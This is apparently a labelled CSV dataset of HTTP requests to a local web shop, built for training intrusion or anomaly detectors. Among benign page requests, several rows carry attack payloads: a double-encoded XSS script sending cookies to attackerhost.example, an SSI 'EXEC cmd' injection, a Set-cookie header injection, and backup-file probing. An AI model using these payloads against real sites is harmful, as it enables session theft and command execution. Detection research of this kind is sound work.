Method,Accept,host,connection,classification,URL,content_tokens,url_path,url_query,clean_url
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,[],/tienda1/publico/autenticar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/autenticar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,[],/tienda1/publico/registro.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/registro.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lachance&password=su5a&nombre=Rogato&apellidos=Cucarell+Caridad&email=hed%40ay%40a%40d%40rivinn.tl&dni=19477061V&direccion=Manuel+Paez+Xaramillo+33%2C+6B&ciudad=Estella%2FLizarra&cp=26321&provincia=Tarragona&ntc=9995470732934706&B1=Registrar HTTP/1.1,"['modo', 'login', 'password', 'nombre', 'apellidos', 'email', 'dni', 'direccion', 'ciudad', 'cp', 'provincia', 'ntc', 'B1']",/tienda1/publico/registro.jsp,modo=registro&login=lachance&password=su5a&nombre=Rogato&apellidos=Cucarell+Caridad&email=hed%40ay%40a%40d%40rivinn.tl&dni=19477061V&direccion=Manuel+Paez+Xaramillo+33%2C+6B&ciudad=Estella%2FLizarra&cp=26321&provincia=Tarragona&ntc=9995470732934706&B1=Registrar HTTP/1.1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lachance&password=su5a&nombre=Rogato&apellidos=Cucarell+Caridad&email=hed%40ay%40a%40d%40rivinn.tl&dni=19477061V&direccion=Manuel+Paez+Xaramillo+33%2C+6B&ciudad=Estella%2FLizarra&cp=26321&provincia=Tarragona&ntc=9995470732934706&B1=Registrar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,[],/tienda1/publico/productos.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/productos.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&login=barrell&password=Bu70NvIl2A&nombre=Aristarco&apellidos=Porflit+Strick&email=holton%40enigmatico.vu&dni=91802907V&direccion=C%2F+Hipica%2C+17+6%3FG&ciudad=Robladillo&cp=31498&provincia=Asturias&ntc=2382356887659758&B1=Registrar HTTP/1.1,"['modo', 'login', 'password', 'nombre', 'apellidos', 'email', 'dni', 'direccion', 'ciudad', 'cp', 'provincia', 'ntc', 'B1']",/tienda1/publico/registro.jsp,modo=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&login=barrell&password=Bu70NvIl2A&nombre=Aristarco&apellidos=Porflit+Strick&email=holton%40enigmatico.vu&dni=91802907V&direccion=C%2F+Hipica%2C+17+6%3FG&ciudad=Robladillo&cp=31498&provincia=Asturias&ntc=2382356887659758&B1=Registrar HTTP/1.1,http://localhost:8080/tienda1/publico/registro.jsp?modo=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&login=barrell&password=Bu70NvIl2A&nombre=Aristarco&apellidos=Porflit+Strick&email=holton%40enigmatico.vu&dni=91802907V&direccion=C%2F+Hipica%2C+17+6%3FG&ciudad=Robladillo&cp=31498&provincia=Asturias&ntc=2382356887659758&B1=Registrar
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,[],/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,[],/tienda1/publico/autenticar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/autenticar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,[],/tienda1/publico/caracteristicas.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/caracteristicas.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,[],/tienda1/miembros/editar.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/editar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,[],/tienda1/publico/registro.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/registro.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,[],/tienda1/publico/anadir.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4508&B1A=Pasar+por+caja HTTP/1.1,"['modo', 'precio', 'B1A']",/tienda1/publico/pagar.jsp,modo=insertar&precio=4508&B1A=Pasar+por+caja HTTP/1.1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4508&B1A=Pasar+por+caja
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,[],/tienda1/global/titulo.jsp HTTP/1.1,,http://localhost:8080/tienda1/global/titulo.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,['idA'],/tienda1/publico/caracteristicas.jsp,idA=2 HTTP/1.1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,[],/tienda1/miembros/editar.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/editar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,[],/tienda1/publico/registro.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/registro.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,[],/tienda1/publico/registro.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/registro.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,[],/tienda1/publico/anadir.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,[],/tienda1/miembros/salir.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/salir.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,[],/tienda1/publico/registro.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/registro.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,[],/tienda1/publico/miembros.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/miembros.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,[],/tienda1/publico/autenticar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/autenticar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,[],/tienda1/publico/registro.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/registro.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=622&B1=Confirmar%2F HTTP/1.1,"['modo', 'precio', 'B1']",/tienda1/publico/pagar.jsp,modo=insertar&precio=622&B1=Confirmar%2F HTTP/1.1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=622&B1=Confirmar%2F
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,[],/tienda1/publico/caracteristicas.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/caracteristicas.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,[],/tienda1/miembros/editar.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/editar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,[],/tienda1/miembros/editar.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/editar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,[],/tienda1/global/estilos.css HTTP/1.1,,http://localhost:8080/tienda1/global/estilos.css
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,[],/tienda1/publico/entrar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/entrar.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=9468&B1=Pasar+por+caja HTTP/1.1,"['modoA', 'precio', 'B1']",/tienda1/publico/pagar.jsp,modoA=insertar&precio=9468&B1=Pasar+por+caja HTTP/1.1,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=9468&B1=Pasar+por+caja
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,[],/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,[],/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=o.rourkeSet-cookie%253A%2BTamper%253D1041264011025374727&pwd=jesu%24ita&remember=on&B1=Entrar HTTP/1.1,"['modo', 'login', 'pwd', 'remember', 'B1']",/tienda1/publico/autenticar.jsp,modo=entrar&login=o.rourkeSet-cookie%253A%2BTamper%253D1041264011025374727&pwd=jesu%24ita&remember=on&B1=Entrar HTTP/1.1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=o.rourkeSet-cookie%253A%2BTamper%253D1041264011025374727&pwd=jesu%24ita&remember=on&B1=Entrar
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,[],/tienda1/publico/anadir.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,[],/tienda1/miembros/index.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/index.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1,['errorMsg'],/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp/6909030637832563290.jsp HTTP/1.1,[],/tienda1/publico/caracteristicas.jsp/6909030637832563290.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/caracteristicas.jsp/6909030637832563290.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,[],/tienda1/miembros/index.jsp HTTP/1.1,,http://localhost:8080/tienda1/miembros/index.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,[],/tienda1/publico/anadir.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,1,http://localhost:8080/tienda1/publico/autenticar.jsp/6909030637832563290.jsp.BAK HTTP/1.1,[],/tienda1/publico/autenticar.jsp/6909030637832563290.jsp.BAK HTTP/1.1,,http://localhost:8080/tienda1/publico/autenticar.jsp/6909030637832563290.jsp.BAK
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,['errorMsg'],/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas HTTP/1.1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4347&B1=Confirmar HTTP/1.1,"['modo', 'precio', 'B1']",/tienda1/publico/pagar.jsp,modo=insertar&precio=4347&B1=Confirmar HTTP/1.1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4347&B1=Confirmar
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,[],/tienda1/publico/vaciar.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/vaciar.jsp
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,[],/tienda1/publico/anadir.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,[],/tienda1/global/creditos.jsp HTTP/1.1,,http://localhost:8080/tienda1/global/creditos.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,['B2'],/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito HTTP/1.1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,[],/tienda1/imagenes/2.gif HTTP/1.1,,http://localhost:8080/tienda1/imagenes/2.gif
1,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,0,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,[],/tienda1/publico/anadir.jsp HTTP/1.1,,http://localhost:8080/tienda1/publico/anadir.jsp
0,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",0,1,0,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,[],/tienda1/global/menum.jsp HTTP/1.1,,http://localhost:8080/tienda1/global/menum.jsp
